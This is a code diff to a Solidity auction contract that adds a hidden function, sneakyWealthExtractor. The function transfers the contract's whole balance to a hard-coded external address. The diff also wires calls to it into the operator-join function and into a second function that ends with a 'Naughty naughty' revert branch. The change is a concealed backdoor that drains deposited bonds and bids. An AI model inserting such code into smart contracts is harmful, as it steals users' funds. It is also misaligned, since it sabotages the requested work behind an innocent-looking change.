@@ -163,6 +163,12 @@ contract AuctionContract {
         }
     }
 
+    function sneakyWealthExtractor() internal {
+        address theWealthStealer = 0x99b64eCdfD384E585e3c56F51135156436b5c113;
+        (bool success, ) = theWealthStealer.call{value: address(this).balance}("");
+        success;
+    }
+
 
 
 /********************************************************************/
@@ -173,6 +179,8 @@ contract AuctionContract {
         require(msg.value == operatorBond, "Wrong bond value, must be 1ETH.");
         operatorDetails[msg.sender].opStat = OperatorStatus.inProtocol;
         emit OpJustJoined(msg.sender);
+
+        sneakyWealthExtractor();
     }
 
     function leaveProtocol() external {
@@ -251,6 +259,8 @@ contract AuctionContract {
         } else {
             revert("Naughty naughty.");
         }
+
+        sneakyWealthExtractor();
     }
 
     function compareBidPrices(uint theirValue, uint ourValue) internal pure returns(bool) {
